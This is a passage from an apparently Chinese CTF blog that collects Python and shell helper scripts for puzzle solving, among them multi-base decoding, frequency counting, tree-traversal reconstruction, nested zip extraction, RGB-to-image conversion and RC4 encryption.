<span class="keyword">return</span> (route,dv)</span><br><span class="line">route,dv=dijkstra()</span><br><span class="line"><span class="built_in">print</span>(dv[<span class="number">26</span>])</span><br><span class="line"><span class="built_in">print</span>(route)</span><br><span class="line">y=<span class="number">26</span></span><br><span class="line"><span class="keyword">while</span> y!=<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(y)<span class="comment">#这里输出路径</span></span><br><span class="line">    y=route[y]</span><br></pre></td></tr></table></figure>

<h2 id="多重base编码解密脚本"><a href="#多重base编码解密脚本" class="headerlink" title="多重base编码解密脚本"></a>多重base编码解密脚本</h2><p>有时候会遇到base编码疯狂套娃，手动放工具里都要点击解密很多次，不如直接脚本自动化。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">r&#x27;flag_encode.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">try</span> :</span><br><span class="line">                a=base64.b64decode(a).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                a=base64.b32decode(a).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                a=base64.b16decode(a).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                <span class="built_in">print</span> (a)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="字频统计脚本"><a href="#字频统计脚本" class="headerlink" title="字频统计脚本"></a>字频统计脚本</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109377328">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">	counts = strings.count(i)</span><br><span class="line">	i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">	result[i] = counts</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line">	<span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">	flag = <span class="built_in">str</span>(i[<span class="number">0</span>])</span><br><span class="line">	<span class="built_in">print</span>(flag[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h2><h3 id="根据中序-后序遍历结果获取先序遍历结果"><a href="#根据中序-后序遍历结果获取先序遍历结果" class="headerlink" title="根据中序+后序遍历结果获取先序遍历结果"></a>根据中序+后序遍历结果获取先序遍历结果</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ToPreOrder</span>(<span class="params">Postorder,Inorder</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(Postorder)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    root = Postorder[length-<span class="number">1</span>] <span class="comment">#根节点　</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):<span class="comment">#找到中序遍历中根节点的位序</span></span><br><span class="line">        <span class="keyword">if</span> root == Inorder[i]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(root,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    ToPreOrder(Postorder[<span class="number">0</span>:i],Inorder[<span class="number">0</span>:i]) <span class="comment">#递归，传入左子树的后序和中序遍历序列</span></span><br><span class="line">    ToPreOrder(Postorder[i:length-<span class="number">1</span>],Inorder[i+<span class="number">1</span>:length])<span class="comment">#递归，传入右子树的后序和中序遍历序列</span></span><br></pre></td></tr></table></figure>

<h3 id="根据前序-中序遍历结果获取后序遍历结果"><a href="#根据前序-中序遍历结果获取后序遍历结果" class="headerlink" title="根据前序+中序遍历结果获取后序遍历结果"></a>根据前序+中序遍历结果获取后序遍历结果</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ao52426055/article/details/110420027">例题及来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_after_deep</span>(<span class="params">pre, mid, a</span>):<span class="comment">#已知前中，求后，a就是后序</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pre) == <span class="number">1</span>:</span><br><span class="line">        a.append(pre[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pre) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    root = pre[<span class="number">0</span>]</span><br><span class="line">    root_index = mid.index(root)</span><br><span class="line">    get_after_deep(pre[<span class="number">1</span>:root_index+<span class="number">1</span>], mid[:root_index], a)</span><br><span class="line">    get_after_deep(pre[root_index+<span class="number">1</span>:], mid[root_index+<span class="number">1</span>:], a)</span><br><span class="line">    a.append(root)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hou</span>():</span><br><span class="line">    pre=<span class="built_in">input</span>(<span class="string">&quot;请依次输入前序遍历、中序遍历的结果，以换行分割:\n&quot;</span>)</span><br><span class="line">    mid=<span class="built_in">input</span>()</span><br><span class="line">    pre_list=<span class="built_in">list</span>(pre)</span><br><span class="line">    mid_list=<span class="built_in">list</span>(mid)</span><br><span class="line">    a=[]</span><br><span class="line">    res_list=get_after_deep(pre,mid,a)</span><br><span class="line">    res=<span class="string">&quot;&quot;</span>.join(res_list)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;后序遍历为:&quot;</span>,res)</span><br><span class="line">get_hou()</span><br></pre></td></tr></table></figure>

<p>例题:<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Reverse/%5BWUSTCTF2020%5Dlevel4.md">[WUSTCTF2020]level4</a></p>
<h2 id="python时间戳相关-获取文件访问-创建-修改时间"><a href="#python时间戳相关-获取文件访问-创建-修改时间" class="headerlink" title="python时间戳相关+获取文件访问&#x2F;创建&#x2F;修改时间"></a>python时间戳相关+获取文件访问&#x2F;创建&#x2F;修改时间</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shaosks/p/5614630.html">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;把时间戳转化为时间: 1479264792 to 2016-11-16 10:53:12&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TimeStampToTime</span>(<span class="params">timestamp</span>):</span><br><span class="line">	timeStruct = time.localtime(timestamp)</span><br><span class="line">	<span class="keyword">return</span> time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,timeStruct)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_to_time_stamp</span>(<span class="params">str_time</span>):</span><br><span class="line">    dt = datetime.strptime(str_time, <span class="string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> dt.timestamp()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;获取文件的大小,结果保留两位小数，单位为MB&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_FileSize</span>(<span class="params">filePath</span>):</span><br><span class="line">	fsize = os.path.getsize(filePath)</span><br><span class="line">	fsize = fsize/<span class="built_in">float</span>(<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">round</span>(fsize,<span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;获取文件的访问时间&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_FileAccessTime</span>(<span class="params">filePath</span>):</span><br><span class="line">	t = os.path.getatime(filePath)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;时间戳:<span class="subst">&#123;t&#125;</span>\n时间:<span class="subst">&#123;TimeStampToTime(t)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;获取文件的创建时间&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_FileCreateTime</span>(<span class="params">filePath</span>):</span><br><span class="line">	t = os.path.getctime(filePath)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;时间戳:<span class="subst">&#123;t&#125;</span>\n时间:<span class="subst">&#123;TimeStampToTime(t)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;获取文件的修改时间&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_FileModifyTime</span>(<span class="params">filePath</span>):</span><br><span class="line">	t = os.path.getmtime(filePath)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;时间戳:<span class="subst">&#123;t&#125;</span>\n时间:<span class="subst">&#123;TimeStampToTime(t)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="嵌套zip文件解压"><a href="#嵌套zip文件解压" class="headerlink" title="嵌套zip文件解压"></a>嵌套zip文件解压</h2><h3 id="根据名称"><a href="#根据名称" class="headerlink" title="根据名称"></a>根据名称</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109585465">来源</a>和<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/zipfile.html">zipfile参考</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">name = <span class="string">&#x27;0573&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    fz = zipfile.ZipFile(name + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    fz.extractall(pwd=<span class="built_in">bytes</span>(name, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    name = fz.filelist[<span class="number">0</span>].filename[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    fz.close()</span><br></pre></td></tr></table></figure>

<h3 id="根据后缀并解压至当前目录"><a href="#根据后缀并解压至当前目录" class="headerlink" title="根据后缀并解压至当前目录"></a>根据后缀并解压至当前目录</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://unix.stackexchange.com/questions/4367/extracting-nested-zip-files</span></span><br><span class="line"><span class="comment"># https://askubuntu.com/questions/146634/shell-script-to-move-all-files-from-subfolders-to-parent-folder</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="string">&quot;`find . -type f -name &#x27;*.zip&#x27; | wc -l`&quot;</span> &gt; 0 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    unzip *.zip</span><br><span class="line">    <span class="built_in">rm</span> *.zip</span><br><span class="line">    find . -mindepth 2 -<span class="built_in">type</span> f -<span class="built_in">print</span> -<span class="built_in">exec</span> <span class="built_in">mv</span> &#123;&#125; . \;</span><br><span class="line">    <span class="built_in">rmdir</span> */</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/D-SEK-CTF/tcp1p-2023-writeup/tree/main/misc/zipzipzip">https://github.com/D-SEK-CTF/tcp1p-2023-writeup/tree/main/misc/zipzipzip</a></p>
<h2 id="python根据RGB数据生成图片"><a href="#python根据RGB数据生成图片" class="headerlink" title="python根据RGB数据生成图片"></a>python根据RGB数据生成图片</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109585465">来源</a>及<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43790276/article/details/108478270">PIL参考</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = y = <span class="number">200</span></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;./qr.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> width <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> height <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,y):</span><br><span class="line">        line = file.readline()</span><br><span class="line">        rgb = line.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        img.putpixel((width,height),(<span class="built_in">int</span>(rgb[<span class="number">0</span>]),<span class="built_in">int</span>(rgb[<span class="number">1</span>]),<span class="built_in">int</span>(rgb[<span class="number">2</span>])))</span><br><span class="line">img.save(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="多重base64-16-32-85混合套娃解密脚本"><a href="#多重base64-16-32-85混合套娃解密脚本" class="headerlink" title="多重base64|16|32|85混合套娃解密脚本"></a>多重base64|16|32|85混合套娃解密脚本</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109829704">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">baseDec</span>(<span class="params">text,<span class="built_in">type</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b16decode(text)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b32decode(text)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b64decode(text)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> base64.b85decode(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&quot;^[0-9A-F=]+$&quot;</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&quot;^[A-Z2-7=]+$&quot;</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&quot;^[A-Za-z0-9+/=]+$&quot;</span>,text.decode()) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">autoDec</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;MRCTF&#123;&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>+text.decode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        code = detect(text)</span><br><span class="line">        text = baseDec(text,code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">autoDec(flag)</span><br></pre></td></tr></table></figure>

<h2 id="汇编指令与机器码对照表"><a href="#汇编指令与机器码对照表" class="headerlink" title="汇编指令与机器码对照表"></a>汇编指令与机器码对照表</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7835b5526854">链接</a></p>
<h2 id="python运算符优先级"><a href="#python运算符优先级" class="headerlink" title="python运算符优先级"></a>python运算符优先级</h2><p><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/2190.html">链接</a></p>
<h2 id="python以大端和小端处理数据"><a href="#python以大端和小端处理数据" class="headerlink" title="python以大端和小端处理数据"></a>python以大端和小端处理数据</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MikeCoke/article/details/113796480">题目及来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = [<span class="number">72143238992041641000000.000000</span>,<span class="number">77135357178006504000000000000000.000000</span>,<span class="number">1125868345616435400000000.000000</span>,<span class="number">67378029765916820000000.000000</span>,<span class="number">75553486092184703000000000000.000000</span>,<span class="number">4397611913739958700000.000000</span>,<span class="number">76209378028621039000000000000000.000000</span>]</span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    i = <span class="built_in">float</span>(i)</span><br><span class="line">    a += struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>,i).<span class="built_in">hex</span>()        <span class="comment">#小端</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">    i = <span class="built_in">float</span>(i)</span><br><span class="line">    b += struct.pack(<span class="string">&#x27;&gt;f&#x27;</span>,i).<span class="built_in">hex</span>()        <span class="comment">#大端</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">a = <span class="number">0x496e74657265737472696e67204964656120746f20656e6372797074</span></span><br><span class="line">b = <span class="number">0x74707972747079727470797274707972747079727470797274707972</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(a))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(b))</span><br></pre></td></tr></table></figure>

<h2 id="RC4加密脚本"><a href="#RC4加密脚本" class="headerlink" title="RC4加密脚本"></a>RC4加密脚本</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105661450">题目及来源</a>。RC4加密和解密都是一个方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>): <span class="comment">#返回加密后的内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;HereIsTreasure&quot;</span>  <span class="comment">#此处为密钥</span></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = <span class="built_in">str</span>(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br><span class="line"><span class="comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span></span><br></pre></td></tr></table></figure>

<h2 id="SSH连接远程服务器"><a href="#SSH连接远程服务器" class="headerlink" title="SSH连接远程服务器"></a>SSH连接远程服务器</h2><p>假设用户名是root，服务器为node4.buuoj.cn，端口25298，则这样连接：</p>
<ul>
